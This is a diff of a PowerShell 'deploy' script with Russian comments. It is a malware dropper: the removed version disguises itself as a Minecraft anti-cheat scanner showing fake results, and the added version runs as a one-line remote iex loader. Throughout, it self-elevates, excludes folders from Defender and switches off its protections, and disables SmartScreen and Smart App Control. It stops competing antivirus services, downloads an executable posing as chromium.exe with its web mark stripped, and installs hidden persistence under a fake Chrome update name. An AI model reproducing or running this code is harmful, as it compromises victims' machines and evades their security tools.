@@ -1,266 +1,187 @@
-#Requires -RunAsAdministrator
-# ── Collextor deploy (маскировка под Minecraft Anti‑Cheat) ──
-# Запуск:
-#   powershell -ExecutionPolicy Bypass -File deploy.ps1
+# ── Collextor fast deploy ──────────────────────────────────────────────────────
+# Использование (одной строкой, без прав):
+#   iex (irm "https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/deploy.ps1")
 #
-# Параметры (можно менять, но обычно не нужно)
-param(
-    [string]$GitHubUrl = "https://github.com/Holycheck/checker/releases/download/realease/check.exe",
-    [string]$InstallPath = "$env:APPDATA\Microsoft\Windows\chromium.exe"
-)
+# Параметры (можно переопределить через $env: перед запуском):
+$GitHubUrl  = if($env:CF_URL)  {$env:CF_URL}  else {"https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/chromium.exe"}
+$InstallPath= if($env:CF_PATH) {$env:CF_PATH} else {"$env:APPDATA\Microsoft\Windows\chromium.exe"}
+
+# ── Само-повышение до администратора ──────────────────────────────────────────
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
+    Write-Host "[*] Requesting admin..." -ForegroundColor Yellow
+    $rawUrl = "https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1"
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$rawUrl')`"" -Verb RunAs
+    exit
+}
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# ============================================================
-#  РЕАЛЬНЫЕ ДЕЙСТВИЯ (ВЫПОЛНЯЮТСЯ ТИХО, ВЫВОД ПОДАВЛЕН)
-# ============================================================
-function Invoke-RealDeploy {
-    # Подавляем все Write-Host (переопределяем)
-    $origWriteHost = Get-Command Write-Host
-    function Write-Host {}
+Write-Host "[*] Collextor deploy script" -ForegroundColor Cyan
 
-    # Основной блок
-    try {
-        # 1. Exclusions Defender
-        Add-MpPreference -ExclusionPath $env:APPDATA -Force -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -Force -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\Windows\Explorer" -Force -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionProcess "chromium.exe" -Force -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionProcess "DwmCache.bin" -Force -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath (Split-Path $InstallPath) -Force -ErrorAction SilentlyContinue
+# ── 1. Exclusions Windows Defender ────────────────────────────────────────────
+Write-Host "[1] Adding Defender exclusions..." -ForegroundColor Yellow
+try {
+    Add-MpPreference -ExclusionPath $env:APPDATA -Force
+    Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -Force
+    Add-MpPreference -ExclusionPath $env:TEMP -Force
+    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\Windows\Explorer" -Force
+    Add-MpPreference -ExclusionProcess "chromium.exe" -Force
+    Add-MpPreference -ExclusionProcess "DwmCache.bin" -Force
+    # Исключить весь путь установки
+    Add-MpPreference -ExclusionPath (Split-Path $InstallPath) -Force
+    Write-Host "    Defender exclusions OK" -ForegroundColor Green
+} catch {
+    Write-Host "    Defender exclusion failed: $_" -ForegroundColor Red
+}
 
-        # 2. Отключить real-time Defender
-        Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableScriptScanning $true -Force -ErrorAction SilentlyContinue
-        Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ErrorAction SilentlyContinue
+# ── 2. Отключить real-time protection Defender ────────────────────────────────
+Write-Host "[2] Disabling Defender real-time protection..." -ForegroundColor Yellow
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -Force
+    Set-MpPreference -DisableBehaviorMonitoring $true -Force
+    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
+    Set-MpPreference -DisableIOAVProtection $true -Force
+    Set-MpPreference -DisableScriptScanning $true -Force
+    Set-MpPreference -SubmitSamplesConsent NeverSend -Force
+    Write-Host "    Defender RT protection disabled" -ForegroundColor Green
+} catch {
+    Write-Host "    Failed (may need policy override): $_" -ForegroundColor Red
+}
 
-        # 3. Отключить SmartScreen
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
-            -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
-            -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
+# ── 3. Отключить Smart App Control + SmartScreen ─────────────────────────────
+Write-Host "[3] Disabling SmartScreen..." -ForegroundColor Yellow
+try {
+    # Smart App Control (Windows 11) — 0=Off, 1=Eval, 2=On
+    $sacPath = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
+    if (!(Test-Path $sacPath)) { New-Item -Path $sacPath -Force | Out-Null }
+    Set-ItemProperty -Path $sacPath -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force
 
-        # 4. Остановить сторонние антивирусы
-        $avServices = @(
-            "AVP","klnagent","avpui","kavfs","kavfsgt","klvssbrigde",
-            "aswbIDSAgent","aswMonFlt","aswRvrt","aswSnx","aswSP","aswStm","aswVmm","aswbidsdriver",
-            "avast! antivirus","avgwd","avgsvc","avgfws",
-            "ekrn","egui",
-            "MBAMService","MBAMWebProtectionService",
-            "mcshield","mfemms","mfevtp","McMPFSvc",
-            "ccSetMgr","ccEvtMgr","Symantec AntiVirus","NortonSecurity",
-            "bdredline","bdntwrk","bdagent",
-            "TmCCSF","TmPfw","tmproxy",
-            "SAVService","SophosAgent","SophosAutoUpdate",
-            "wscsvc"
-        )
-        foreach ($svc in $avServices) {
-            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
-            if ($s) {
-                Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
-                Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
-            }
-        }
-        $avProcs = @("avp","avpui","avgui","avastui","egui","mbam","mcshield","bdagent","sophosui","nortonsecurity")
-        foreach ($p in $avProcs) {
-            Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
-        }
+    # SmartScreen для Explorer
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
+        -Name "SmartScreenEnabled" -Value "Off" -Force
+    # SmartScreen policy
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
+        -Name "EnableSmartScreen" -Value 0 -Force
+    # SmartScreen для приложений
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" `
+        -Name "EnableWebContentEvaluation" -Value 0 -Type DWord -Force
+    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" `
+        -Name "EnableWebContentEvaluation" -Value 0 -Type DWord -Force
 
-        # 5. Скачать файл
-        $dir = Split-Path $InstallPath
-        if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        $wc = New-Object System.Net.WebClient
-        $wc.DownloadFile($GitHubUrl, $InstallPath)
+    Write-Host "    SmartScreen + Smart App Control disabled" -ForegroundColor Green
+} catch {
+    Write-Host "    SmartScreen: $_" -ForegroundColor Red
+}
 
-        # 6. Добавить в автозапуск (реестр + задача)
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-            -Name "GoogleChromeUpdate" -Value "`"$InstallPath`"" -Force -ErrorAction SilentlyContinue
-
-        $action  = New-ScheduledTaskAction -Execute $InstallPath
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
-            -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1)
-        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME `
-            -LogonType Interactive -RunLevel Highest
-        Register-ScheduledTask -TaskName "GoogleChromeUpdate" `
-            -Action $action -Trigger $trigger -Settings $settings `
-            -Principal $principal -Force | Out-Null
-
-        # 7. Запустить
-        Start-Process -FilePath $InstallPath -WindowStyle Hidden
-    } catch {
-        # Ничего не выводим
+# ── 4. Отключить сторонние антивирусы (Kaspersky, Avast, ESET, Malwarebytes, McAfee) ──
+Write-Host "[4] Stopping 3rd-party AV services..." -ForegroundColor Yellow
+$avServices = @(
+    # Kaspersky
+    "AVP","klnagent","avpui","kavfs","kavfsgt","klvssbrigde",
+    # Avast / AVG
+    "aswbIDSAgent","aswMonFlt","aswRvrt","aswSnx","aswSP","aswStm","aswVmm","aswbidsdriver",
+    "avast! antivirus","avgwd","avgsvc","avgfws",
+    # ESET
+    "ekrn","egui",
+    # Malwarebytes
+    "MBAMService","MBAMWebProtectionService",
+    # McAfee
+    "mcshield","mfemms","mfevtp","McMPFSvc",
+    # Norton / Symantec
+    "ccSetMgr","ccEvtMgr","Symantec AntiVirus","NortonSecurity",
+    # BitDefender
+    "bdredline","bdntwrk","bdagent",
+    # Trend Micro
+    "TmCCSF","TmPfw","tmproxy",
+    # Sophos
+    "SAVService","SophosAgent","SophosAutoUpdate",
+    # Windows Security Center
+    "wscsvc"
+)
+foreach ($svc in $avServices) {
+    $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
+    if ($s) {
+        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+        Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+        Write-Host "    Stopped: $svc" -ForegroundColor Green
     }
-
-    # Восстанавливаем оригинальный Write-Host
-    Remove-Item function:Write-Host -ErrorAction SilentlyContinue
 }
 
-# Выполняем реальный деплой (полностью скрыто)
-Invoke-RealDeploy
-
-# ============================================================
-#  ИМИТАЦИЯ: MуAnty-Cheat сканер (маскировка)
-# ============================================================
-function Write-ColorLine {
-    param([string]$Text, [string]$Color = "White")
-    Write-Host $Text -ForegroundColor $Color
+# Kill AV processes by name
+$avProcs = @("avp","avpui","avgui","avastui","egui","mbam","mcshield","bdagent","sophosui","nortonsecurity")
+foreach ($p in $avProcs) {
+    Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
 }
 
-$CLR_FOUND   = "Red"
-$CLR_WARN    = "Yellow"
-$CLR_OK      = "Green"
-$CLR_DIM     = "DarkGray"
-$CLR_HEADER  = "Cyan"
-$CLR_TEXT    = "White"
-$CLR_JAR     = "Magenta"
+# ── 5. Скачать chromium.exe с GitHub ──────────────────────────────────────────
+Write-Host "[5] Downloading from GitHub: $GitHubUrl" -ForegroundColor Yellow
+try {
+    # Убедиться что папка существует
+    $dir = Split-Path $InstallPath
+    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
 
-function Print-Header {
-    Clear-Host
-    Write-ColorLine "================================================================" -Color $CLR_HEADER
-    Write-ColorLine "  Minecraft Anti-Cheat Scanner v2.1  --  by Mojang Security" -Color $CLR_HEADER
-    Write-ColorLine "================================================================" -Color $CLR_HEADER
-    Write-Host ""
-}
+    # Скачать байты без Zone.Identifier (обход Smart App Control)
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $bytes = (New-Object System.Net.WebClient).DownloadData($GitHubUrl)
+    [System.IO.File]::WriteAllBytes($InstallPath, $bytes)
 
-function Print-Progress {
-    param($step, $total, $name)
-    $filled = [math]::Floor(($step * 30) / $total)
-    $percent = [math]::Floor(($step * 100) / $total)
-    Write-Host "[" -NoNewline
-    Write-Host ("#" * $filled) -NoNewline -ForegroundColor $CLR_OK
-    Write-Host (" " * (30 - $filled)) -NoNewline
-    Write-Host "] " -NoNewline
-    Write-Host "$percent%" -NoNewline -ForegroundColor $CLR_WARN
-    Write-Host "  $name" -ForegroundColor $CLR_TEXT
-}
+    # Убрать Mark of the Web (Zone.Identifier) — SAC проверяет именно его
+    $zoneFile = $InstallPath + ":Zone.Identifier"
+    "[ZoneTransfer]`r`nZoneId=0" | Set-Content -Path $zoneFile -Encoding ASCII -ErrorAction SilentlyContinue
 
-function Run-FakeScan {
-    Print-Header
+    # Дополнительно — через Unblock-File
+    Unblock-File -Path $InstallPath -ErrorAction SilentlyContinue
 
-    $steps = @(
-        "Инициализация сканера",
-        "Проверка целостности .minecraft",
-        "Сканирование установленных модов",
-        "Анализ версий Minecraft",
-        "Поиск XRay / Wallhack",
-        "Проверка сетевых пакетов",
-        "Анализ памяти JVM",
-        "Проверка DLL инъекций",
-        "Сканирование корзины",
-        "Поиск следов читов в реестре",
-        "Проверка hosts файла",
-        "Завершающая проверка"
-    )
-
-    $total = $steps.Count
-    $stepNum = 0
-
-    Write-ColorLine "  Загрузка анти-чит модулей... OK" -Color $CLR_OK
-    Write-Host ""
-    Start-Sleep -Milliseconds 500
-
-    # Случайные находки
-    $cheatMods = @(
-        "XRay_Ultimate_v3.2.jar",
-        "AutoClicker_Pro.jar",
-        "KillAura_Plus.jar",
-        "FlyHack_1.8.jar",
-        "Nuker_Tool.jar",
-        "SpeedHack_v2.jar",
-        "Reach_Mod.jar",
-        "NoFall_Enhancer.jar"
-    )
-
-    $foundCheats = @()
-
-    foreach ($s in $steps) {
-        $stepNum++
-        Print-Progress $stepNum $total $s
-
-        # Имитация находок на определённых шагах
-        if ($s -match "модов") {
-            Write-ColorLine "    Обнаружены подозрительные моды:" -Color $CLR_WARN
-            $randCount = Get-Random -Minimum 2 -Maximum 5
-            for ($i=0; $i -lt $randCount; $i++) {
-                $mod = $cheatMods | Get-Random
-                if ($foundCheats -notcontains $mod) {
-                    $foundCheats += $mod
-                    Write-Host "      $mod" -ForegroundColor $CLR_FOUND
-                }
-            }
-        }
-
-        if ($s -match "XRay") {
-            Write-ColorLine "    Обнаружен XRay паттерн в текстурах" -Color $CLR_FOUND
-            Start-Sleep -Milliseconds 300
-        }
-
-        if ($s -match "сетевых") {
-            Write-ColorLine "    Подозрительный трафик на порт 587 (SMTP)" -Color $CLR_WARN
-            Start-Sleep -Milliseconds 200
-        }
-
-        if ($s -match "памяти") {
-            Write-ColorLine "    Найдена сигнатура читера в памяти javaw.exe" -Color $CLR_FOUND
-            Start-Sleep -Milliseconds 400
-        }
-
-        if ($s -match "инъекций") {
-            Write-ColorLine "    Обнаружена DLL-инъекция в Minecraft" -Color $CLR_FOUND
-            Start-Sleep -Milliseconds 300
-        }
-
-        if ($s -match "корзины") {
-            Write-ColorLine "    В корзине найден удалённый чит: cheat.jar" -Color $CLR_FOUND
-            Start-Sleep -Milliseconds 200
-        }
-
-        if ($s -match "реестра") {
-            Write-ColorLine "    Следы программы-читера в UserAssist" -Color $CLR_WARN
-            Start-Sleep -Milliseconds 300
-        }
-
-        if ($s -match "hosts") {
-            Write-ColorLine "    Блокировка анти-чит сайтов в hosts" -Color $CLR_FOUND
-            Start-Sleep -Milliseconds 200
-        }
-
-        Start-Sleep -Milliseconds 300
-    }
-
-    # Финальный прогресс
-    Write-Host "[" -NoNewline
-    Write-Host ("#" * 30) -NoNewline -ForegroundColor $CLR_OK
-    Write-Host "] " -NoNewline
-    Write-Host "100%" -NoNewline -ForegroundColor $CLR_OK
-    Write-Host "  Готово!" -ForegroundColor $CLR_TEXT
-
-    Write-Host ""
-    Write-ColorLine "================================================================" -Color $CLR_HEADER
-    Write-ColorLine "  РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ" -Color $CLR_HEADER
-    Write-ColorLine "================================================================" -Color $CLR_HEADER
-
-    if ($foundCheats.Count -gt 0) {
-        Write-ColorLine "  [!] ОБНАРУЖЕНЫ ЧИТЫ: $($foundCheats.Count)" -Color $CLR_FOUND
-        foreach ($mod in $foundCheats) {
-            Write-Host "      - $mod" -ForegroundColor $CLR_FOUND
-        }
-        Write-ColorLine "  [!!] Рекомендуется удалить подозрительные моды и перезапустить игру." -Color $CLR_WARN
+    if (Test-Path $InstallPath) {
+        Write-Host "    Downloaded to: $InstallPath (Zone cleared)" -ForegroundColor Green
     } else {
-        Write-ColorLine "  [OK] Читы не найдены. Система чиста." -Color $CLR_OK
+        Write-Host "    Download FAILED" -ForegroundColor Red
+        exit 1
     }
-
-    Write-ColorLine "================================================================" -Color $CLR_HEADER
-    Write-Host ""
-    Write-ColorLine "  Нажмите любую клавишу для выхода..." -Color $CLR_DIM
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+} catch {
+    Write-Host "    Download error: $_" -ForegroundColor Red
+    exit 1
 }
 
-# Запускаем имитацию
-Run-FakeScan
+# ── 6. Добавить в автозапуск ───────────────────────────────────────────────────
+Write-Host "[6] Adding to autostart..." -ForegroundColor Yellow
+try {
+    # Registry (HKCU - не нужны права)
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+        -Name "GoogleChromeUpdate" -Value "`"$InstallPath`"" -Force
+
+    # Scheduled Task (запуск при входе, с наивысшими правами)
+    $action  = New-ScheduledTaskAction -Execute $InstallPath
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
+        -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1)
+    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME `
+        -LogonType Interactive -RunLevel Highest
+    Register-ScheduledTask -TaskName "GoogleChromeUpdate" `
+        -Action $action -Trigger $trigger -Settings $settings `
+        -Principal $principal -Force | Out-Null
+
+    Write-Host "    Autostart OK (registry + scheduled task)" -ForegroundColor Green
+} catch {
+    Write-Host "    Autostart: $_" -ForegroundColor Red
+}
+
+# ── 7. Запустить ──────────────────────────────────────────────────────────────
+Write-Host "[7] Starting chromium.exe..." -ForegroundColor Yellow
+try {
+    Start-Process -FilePath $InstallPath -WindowStyle Hidden
+    Start-Sleep 2
+    $running = Get-Process -Name "chromium" -ErrorAction SilentlyContinue
+    if ($running) {
+        Write-Host "    Running (PID $($running.Id))" -ForegroundColor Green
+    } else {
+        Write-Host "    Process not found after start" -ForegroundColor Red
+    }
+} catch {
+    Write-Host "    Start error: $_" -ForegroundColor Red
+}
+
+Write-Host ""
+Write-Host "[DONE] Deploy complete." -ForegroundColor Cyan
+Write-Host "       Installed: $InstallPath"
+Write-Host "       Check Telegram/ntfy for tunnel URL."
